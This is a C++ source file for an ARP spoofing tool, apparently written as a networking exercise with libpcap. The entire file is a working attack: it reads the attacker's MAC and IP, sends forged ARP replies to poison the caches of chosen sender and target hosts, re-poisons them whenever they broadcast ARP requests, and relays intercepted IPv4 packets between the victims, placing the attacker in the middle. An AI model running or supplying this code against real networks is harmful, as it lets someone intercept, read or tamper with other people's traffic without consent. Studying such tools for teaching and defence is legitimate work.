#include <cstdio>
#include <pcap.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct EthIpv4Packet {
    EthHdr eth_;
    ip ip_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

Mac get_attacker_mac(char *dev) { // eth0
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ -1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    return Mac((uint8_t *)ifr.ifr_hwaddr.sa_data);
}

Ip get_attacker_ip(char *dev){
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    return Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}

void printMac(Mac mac){
    std::string x(mac);
    printf("%s\n", x.c_str());
}

void printIP(Ip ip){
    std::string x(ip);
    printf("%s\n", x.c_str());
}

void send_arp_request(pcap_t *handle, Ip attackerIp, Ip senderIp, Mac attackerMac){
    EthArpPacket p;

    p.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    p.eth_.smac_ = attackerMac;
    p.eth_.type_ = htons(EthHdr::Arp);

    p.arp_.hrd_  = htons(ArpHdr::ETHER);
    p.arp_.pro_  = htons(EthHdr::Ip4);
    p.arp_.hln_  = Mac::SIZE;
    p.arp_.pln_  = Ip::SIZE;
    p.arp_.op_   = htons(ArpHdr::Request);

    p.arp_.smac_ = attackerMac;
    p.arp_.sip_  = htonl(attackerIp);
    p.arp_.tmac_ = Mac("00:00:00:00:00:00");
    p.arp_.tip_  = htonl(senderIp);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&p), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "[pcap_sendpacket return %d error=%s]\n", res, pcap_geterr(handle));
    }
}

void send_arp_reply(pcap_t *handle, Mac senderMac, Mac attackerMac, Ip senderIp, Ip targetIp){
    EthArpPacket p;

    p.eth_.dmac_ = senderMac;
    p.eth_.smac_ = attackerMac;
    p.eth_.type_ = htons(EthHdr::Arp);

    p.arp_.hrd_  = htons(ArpHdr::ETHER);
    p.arp_.pro_  = htons(EthHdr::Ip4);
    p.arp_.hln_  = Mac::SIZE;
    p.arp_.pln_  = Ip::SIZE;
    p.arp_.op_   = htons(ArpHdr::Reply);

    p.arp_.smac_ = attackerMac;
    p.arp_.sip_  = htonl(targetIp);
    p.arp_.tmac_ = senderMac;
    p.arp_.tip_  = htonl(senderIp);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&p), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "[pcap_sendpacket return %d error=%s]\n", res, pcap_geterr(handle));
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        usage();
		return -1;
    }

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
        fprintf(stderr, "[couldn't open device %s(%s)]\n", dev, errbuf);
		return -1;
	}

    /* session <- attacker mac & ip */
    Mac attackerMac = get_attacker_mac(dev);
    Ip attackerIp = get_attacker_ip(dev);

    const int sessionLength = (argc-2)/2;
    EthArpPacket *session = new EthArpPacket[sessionLength];

    /* parsing params */
    int num = 0;
    for(int i = 0; i < argc; i+=2){
        if (i > 1){
            session[num].arp_.sip_ = Ip(argv[i]);   /* sender */
            session[num].arp_.tip_ = Ip(argv[i+1]); /* target */
            num++;
        }
    }

    for(int i = 0; i < sessionLength; i++){
        Ip senderIp = session[i].arp_.sip_;
        Ip targetIp = session[i].arp_.tip_;

        send_arp_request(handle, attackerIp, senderIp, attackerMac);
        send_arp_request(handle, attackerIp, targetIp, attackerMac);
    }

    while(1){
        struct pcap_pkthdr* header;
        const u_char* packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        struct EthArpPacket *etharp = (struct EthArpPacket *)packet;

        /* ARP infect & re-infect */
        if(etharp->eth_.type_ == htons(EthHdr::Arp)){
            if(etharp->arp_.op_ == htons(ArpHdr::Reply)){
                for(int i = 0; i < sessionLength; i++){
                    if(htonl(etharp->arp_.sip_) == session[i].arp_.sip_){
                        printf("[ARP infect]\n");
                        session[i].eth_.smac_ = etharp->arp_.smac_;
                        send_arp_reply(handle, session[i].eth_.smac_, attackerMac, session[i].arp_.sip_, session[i].arp_.tip_);
                        continue;
                    }
                    if(htonl(etharp->arp_.sip_) == session[i].arp_.tip_){
                        session[i].eth_.dmac_ = etharp->arp_.smac_;
                    }
                }
                continue;
            }
            if(etharp->arp_.op_ == htons(ArpHdr::Request)){
                if(etharp->eth_.dmac_ == Mac("ff:ff:ff:ff:ff:ff")){ /* broadcast */
                    for(int i = 0; i < sessionLength; i++){
                        printf("[ARP re-infect]\n");
                        send_arp_request(handle, attackerIp, session[i].arp_.sip_, attackerMac);
                        send_arp_request(handle, attackerIp, session[i].arp_.tip_, attackerMac);
                        send_arp_reply(handle, session[i].eth_.smac_, attackerMac, session[i].arp_.sip_, session[i].arp_.tip_);
                    }
                }
                continue;
            }
        }

        if(etharp->eth_.type_ == htons(EthHdr::Ip4)){
            /* is this my packet? */
            struct EthIpv4Packet *ethipv4 = (struct EthIpv4Packet *)packet;

            if(htonl(ethipv4->ip_.ip_dst.s_addr) == attackerIp){
                continue;
            }

            for(int i = 0; i < sessionLength; i++){
                if(htonl(ethipv4->ip_.ip_dst.s_addr) == session[i].arp_.sip_){ // rep
                    ethipv4->eth_.smac_ = attackerMac; // !
                    ethipv4->eth_.dmac_ = session[i].eth_.smac_;

                    pcap_sendpacket(handle, packet, header->len);
                    continue;
                }

                if(htonl(ethipv4->ip_.ip_src.s_addr) == session[i].arp_.sip_){ // req
                    ethipv4->eth_.smac_ = attackerMac; // !
                    ethipv4->eth_.dmac_ = session[i].eth_.dmac_;

                    res = pcap_sendpacket(handle, packet, header->len);
                    continue;
                }
            }
        }
    }

    pcap_close(handle);
}
